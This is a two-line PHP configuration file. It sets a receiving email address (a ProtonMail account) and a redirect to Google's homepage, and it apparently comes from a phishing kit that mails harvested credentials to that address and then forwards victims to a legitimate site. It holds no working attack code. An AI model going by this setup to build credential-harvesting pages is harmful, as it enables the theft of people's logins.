<?php 
$Receive_email="dreywyt22@protonmail.com";
$redirect="https://www.google.com/";
?>